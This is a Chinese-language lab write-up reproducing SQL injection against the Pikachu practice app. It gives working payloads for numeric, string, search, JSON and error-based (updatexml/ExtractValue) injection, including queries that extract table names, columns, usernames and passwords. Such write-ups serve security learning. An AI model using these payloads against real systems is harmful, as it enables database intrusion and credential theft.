# SQL注入实例

## 实验名称

SQL注入实例

## 实验目的

SQL注入实例复现

## 核心步骤

### 数字型注入

1.发送请求，Burp抓包

2.数据中加入“or 1=1”

```shell
or 1=1
```



3.响应结果

![数字型注入响应](images/数字型注入响应.png)



### 字符型注入

1.搜索框（请求数据）中加入“' or 1=1#”

```shell
' or 1=1#
```



2.搜索框（请求数据）中加入“' or 1=1 union select username,password from users#”

```shell
' or 1=1 union select username,password from users#
```



3.响应结果

![字符型注入响应](images/字符型注入响应.png)

![字符型注入响应1](images/字符型注入响应1.png)



### 搜索型注入

1.搜索框（请求数据）中加入“%' or 1=1#”

```shell
%' or 1=1#
```

2.响应结果

![搜索型注入响应](images/搜索型注入响应.png)



### XX型注入

1.搜索框（请求数据）中加入"') or 1=1#"（注意符号用英文）

```shell
') or 1=1#
```

2.响应内容

![xx型注入响应](images/xx型注入响应.png)



### Json注入

1.在json数据中加入“ ' or 1=1#”

```shell
json={"username":"admin"} --> json={"username":"admin' or 1=1#"}
```

2.响应结果

![json注入响应](images/json注入响应.png)

### 盲注

SQL语句执行带有错误参数的数据库常用函数时会报错，如果服务端没有对报错信息进行过滤，直接相应给客户端，就会造成敏感信息泄露。

```shell
select updatexml(1,concat('>>',(select version()),'<<'),1);  ##故意输入错的参数
ERROR 1105 (HY000)：XPATH syntax error：'>>5.5.53<<'  ##报错信息-->数据库版本号

select updatexml(1,concat('>>',(select user()),'<<'),1);  ##故意输入错的参数
ERROR 1105 (HY000)：XPATH syntax error：'>>root@localhost<<'  ##报错信息-->当前登录用户

select updatexml(1,concat('>>',(select database()),'<<'),1);  ##故意输入错的参数
ERROR 1105 (HY000)：XPATH syntax error：'>>pikachu<<'  ##报错信息-->当前数据库
```

```shell
select ExtractValue(1,concat('>>',(select version()),'<<'));  ##故意输入错的函数
ERROR 1105 (HY000)：XPATH syntax error：'>>5.5.53<<'  ##报错信息-->数据库版本号

select ExtractValue(1,concat('>>',(select user()),'<<'));  ##故意输入错的函数
ERROR 1105 (HY000)：XPATH syntax error：'>>root@localhost<<'  ##报错信息-->当前登录用户

select ExtractValue(1,concat('>>',(select database()),'<<'));  ##故意输入错的函数
ERROR 1105 (HY000)：XPATH syntax error：'>>pikachu<<'  ##报错信息-->当前数据库
```

1.想办法让数据库进行报错，如在响应头键值对后面加入

```shell
'or updatexml(1,(concat('>>',(select version()),'<<')),1) or'  #获取数据库版本号
'or updatexml(1,(concat('>>',(select user()),'<<')),1) or'  #获取当前登录用户
'or updatexml(1,(concat('>>',(select database()),'<<')),1) or'  #获取当前数据库
```

2.响应结果

![盲注响应updatexml_version](images/盲注响应updatexml_version.png)

![盲注响应updatexml_user](images/盲注响应updatexml_user.png)

![盲注响应updatexml_database](images/盲注响应updatexml_database.png)



#### 爆破数据库信息

**information_schema**库中存储了所有库名、表名、字段名，受"concat"函数限制，每次只能查询一列一行的数据，用"limit x,1"限制查询条数

##### 爆表名

**pikachu库里有哪些表**

```shell
k' and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema="pikachu" limit 0,1),0x7e)),1)#  
```

![爆表名](images/爆表名.png)

##### 爆字段名

**pikachu库里的httpinfo表有哪些字段**

```shell
k' and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_name="httpinfo" and table_schema="pikachu" limit 0,1),0x7e)),1)#  
```

![爆字段](images/爆字段.png)

##### 爆字段内容

**pikachu库里的httpinfo表的id字段有哪些内容**

```shell
k' and updatexml(1,concat(0x7e,(select id from httpinfo limit 0,1),0x7e),1)#
```

![爆字段内容1](images/爆字段内容1.png)

如果知道**users表**中有**username**和**password**两个字段，那就有意思了

```shell
k' and updatexml(1,(concat(0x7e,(select username from users limit 0,1),0x7e)),1)#
```

![爆用户名](images/爆用户名.png)

```shell
k' and updatexml(1,(concat(0x7e,(select password from users limit 0,1),0x7e)),1)#
```

![爆密码](images/爆密码.png)



### 原理解释

#### 工程师视角

后端代码未对请求数据进行严格筛选、未对报错信息进行有效拦截。攻击者在请求数据中加入带有错误参数格式的特定函数。代码自动拼接指令并在MYSQL（数据库）自动执行后回显报错信息。

#### 通俗解释

秘密基地看守值班时注意力不集中，没有对进入基地的人员进行有效管控，基地也没有进行区域屏蔽信号。导致小偷潜入基地后获取具体地形布局信息并通过网络发送给了基地外面的同伙。



## 关键问题

需要猜后端代码中的数据处理逻辑



## 实验结果

成功复现SQL注入实例



【持续学习中···】